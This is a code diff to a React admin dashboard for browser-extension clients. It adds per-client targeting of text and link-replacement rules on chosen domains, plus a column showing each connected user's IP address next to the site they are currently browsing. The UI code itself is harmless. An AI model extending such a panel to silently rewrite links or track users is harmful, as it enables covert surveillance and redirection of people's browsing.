@@ -2361,6 +2842,7 @@ export default function AdminDashboard() {
                   <tr>
                     <th>Status</th>
                     <th>Target Domain</th>
+                    <th>Audience Scope</th>
                     <th>Text Transformation</th>
                     <th>Target Selector</th>
                     <th>Updated</th>
@@ -2370,7 +2852,7 @@ export default function AdminDashboard() {
                 <tbody>
                   {replacements.length === 0 ? (
                     <tr>
-                      <td colSpan={6} style={{ textAlign: 'center', padding: '36px', color: 'var(--text-secondary)' }}>
+                      <td colSpan={7} style={{ textAlign: 'center', padding: '36px', color: 'var(--text-secondary)' }}>
                         <div>No text replacement rules created yet.</div>
                         <div style={{ marginTop: '8px' }}>
                           <button
@@ -2404,14 +2886,52 @@ export default function AdminDashboard() {
                           </span>
                         </td>
                         <td>
-                          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-                            <span style={{ background: '#fee2e2', color: '#991b1b', padding: '3px 8px', borderRadius: '4px', fontSize: '12px', fontWeight: 600, maxWidth: '160px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.originalText}>
-                              {r.originalText || '(any text)'}
+                          {r.targetClientId ? (
+                            <span
+                              className="badge badge-purple"
+                              style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', fontSize: '11px', fontFamily: 'var(--font-mono)' }}
+                              title={`Target Client ID: ${r.targetClientId}`}
+                            >
+                              <span>🎯</span>
+                              <span>{r.targetClientId.length > 18 ? `${r.targetClientId.slice(0, 16)}...` : r.targetClientId}</span>
                             </span>
-                            <span style={{ fontWeight: 800, color: 'var(--text-secondary)' }}>➔</span>
-                            <span style={{ background: '#dcfce7', color: '#166534', padding: '3px 8px', borderRadius: '4px', fontSize: '12px', fontWeight: 700, maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.replacementText}>
-                              {r.replacementText}
+                          ) : (
+                            <span
+                              className="badge badge-green"
+                              style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', fontSize: '11px' }}
+                            >
+                              <span>🌐</span>
+                              <span>All Users (Global)</span>
                             </span>
+                          )}
+                        </td>
+                        <td>
+                          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                              <span style={{ background: '#fee2e2', color: '#991b1b', padding: '3px 8px', borderRadius: '4px', fontSize: '12px', fontWeight: 600, maxWidth: '160px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.originalText}>
+                                {r.originalText || '(any text)'}
+                              </span>
+                              <span style={{ fontWeight: 800, color: 'var(--text-secondary)' }}>➔</span>
+                              <span style={{ background: '#dcfce7', color: '#166534', padding: '3px 8px', borderRadius: '4px', fontSize: '12px', fontWeight: 700, maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.replacementText}>
+                                {r.replacementText || '(text unchanged)'}
+                              </span>
+                            </div>
+                            {r.replacementHref && (
+                              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '11px' }}>
+                                <span style={{ color: '#0369a1', fontWeight: 700 }}>🔗 Link:</span>
+                                {r.originalHref && (
+                                  <>
+                                    <span style={{ background: '#e0f2fe', color: '#0369a1', padding: '1px 5px', borderRadius: '3px', maxWidth: '120px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.originalHref}>
+                                      {r.originalHref}
+                                    </span>
+                                    <span style={{ color: '#0284c7', fontWeight: 800 }}>➔</span>
+                                  </>
+                                )}
+                                <span style={{ background: '#dbeafe', color: '#1e40af', padding: '1px 6px', borderRadius: '3px', fontWeight: 700, maxWidth: '180px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.replacementHref}>
+                                  {r.replacementHref}
+                                </span>
+                              </div>
+                            )}
                           </div>
                         </td>
                         <td>
@@ -2585,6 +3105,7 @@ export default function AdminDashboard() {
                     <th>Live Status</th>
                     <th>Client ID</th>
                     <th>Current Domain</th>
+                    <th>IP Address</th>
                     <th>Last Heartbeat</th>
                     <th style={{ textAlign: 'right' }}>Direct 1-to-1 Action</th>
                   </tr>
@@ -2592,7 +3113,7 @@ export default function AdminDashboard() {
                 <tbody>
                   {clients.length === 0 ? (
                     <tr>
-                      <td colSpan={5} style={{ textAlign: 'center', padding: '36px', color: 'var(--text-secondary)' }}>
+                      <td colSpan={6} style={{ textAlign: 'center', padding: '36px', color: 'var(--text-secondary)' }}>
                         No browser extension clients connected yet. Install the extension in Chrome to see live clients here.
                       </td>
                     </tr>
@@ -2638,6 +3159,44 @@ export default function AdminDashboard() {
                           <span style={{ fontWeight: 600, color: 'var(--brand-purple)' }}>
                             {c.domain || c.lastDomain || 'unknown'}
                           </span>
+                        </td>
+                        <td>
+                          <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
+                            <span
+                              style={{
+                                fontFamily: 'var(--font-mono)',
+                                fontSize: '12px',
+                                background: '#f8fafc',
+                                padding: '3px 8px',
+                                borderRadius: '4px',
+                                border: '1px solid #cbd5e1',
+                                color: '#1e293b',
+                                fontWeight: 600,
+                                display: 'inline-flex',
+                                alignItems: 'center',
+                                gap: '5px',
+                              }}
+                            >
+                              🌐 {c.ip || '127.0.0.1'}
+                            </span>
+                            <button
+                              type="button"
+                              onClick={() => {
+                                navigator.clipboard.writeText(c.ip || '127.0.0.1');
+                                showToast(`Copied IP ${c.ip || '127.0.0.1'} to clipboard!`);
+                              }}
+                              style={{
+                                background: 'transparent',
+                                border: 'none',
+                                cursor: 'pointer',
+                                fontSize: '11px',
+                                opacity: 0.6,
+                              }}
+                              title="Copy Client IP"
+                            >
+                              📋
+                            </button>
+                          </div>
                         </td>
                         <td style={{ color: 'var(--text-secondary)', fontSize: '12px' }}>
                           {c.lastSeen ? new Date(c.lastSeen).toLocaleTimeString() : '—'}
@@ -3001,8 +3560,10 @@ export default function AdminDashboard() {
                   </span>
                 </div>
                 {alertTargetClient && (
-                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginTop: '2px' }}>
-                    Currently browsing: <strong>{alertTargetClient.domain || 'unknown website'}</strong>
+                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginTop: '2px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <span>Currently browsing: <strong>{alertTargetClient.domain || 'unknown website'}</strong></span>
+                    <span>•</span>
+                    <span>IP Address: <strong style={{ color: 'var(--brand-purple)', fontFamily: 'var(--font-mono)' }}>{alertTargetClient.ip || '127.0.0.1'}</strong></span>
                   </div>
                 )}
               </div>
